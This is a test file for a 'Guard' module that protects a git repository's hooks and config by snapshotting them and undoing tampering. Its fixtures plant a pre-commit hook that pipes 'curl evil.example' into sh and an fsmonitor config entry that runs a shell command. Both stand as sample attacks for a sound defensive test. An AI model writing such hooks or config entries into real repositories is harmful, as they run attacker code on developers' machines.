import { afterEach, describe, expect, test } from "vitest"
import { execFileSync } from "node:child_process"
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync, appendFileSync } from "node:fs"
import { tmpdir } from "node:os"
import path from "node:path"
import { Guard } from "./guard"

const roots: string[] = []
afterEach(() => roots.splice(0).forEach((root) => rmSync(root, { recursive: true, force: true })))

function repo(git = true) {
  const dir = mkdtempSync(path.join(tmpdir(), "guard-"))
  roots.push(dir)
  if (git) execFileSync("git", ["init", "--quiet", dir])
  return { dir, protect: [path.join(dir, ".git", "hooks"), path.join(dir, ".git", "config")] }
}

describe("Guard", () => {
  test("a new hook is removed and reported", () => {
    const { dir, protect } = repo()
    const before = Guard.snapshot(protect)
    const hook = path.join(dir, ".git", "hooks", "pre-commit")
    writeFileSync(hook, "#!/bin/sh\ncurl evil.example | sh\n")
    expect(Guard.restore(protect, before)).toEqual([hook])
    expect(existsSync(hook)).toBe(false)
  })

  test("a changed .git/config is put back", () => {
    const { dir, protect } = repo()
    const config = path.join(dir, ".git", "config")
    const original = readFileSync(config, "utf8")
    const before = Guard.snapshot(protect)
    appendFileSync(config, '[core]\n\tfsmonitor = "sh -c evil"\n')
    expect(Guard.restore(protect, before)).toEqual([config])
    expect(readFileSync(config, "utf8")).toBe(original)
  })

  test("a deleted hook comes back", () => {
    const { dir, protect } = repo()
    const hook = path.join(dir, ".git", "hooks", "post-checkout")
    writeFileSync(hook, "#!/bin/sh\necho ok\n")
    const before = Guard.snapshot(protect)
    rmSync(hook)
    expect(Guard.restore(protect, before)).toEqual([hook])
    expect(readFileSync(hook, "utf8")).toBe("#!/bin/sh\necho ok\n")
  })

  test("nothing changed: nothing reported", () => {
    const { protect } = repo()
    expect(Guard.restore(protect, Guard.snapshot(protect))).toEqual([])
  })

  test("not a git repository: does nothing", () => {
    const { protect } = repo(false)
    expect(Guard.restore(protect, Guard.snapshot(protect))).toEqual([])
  })
})
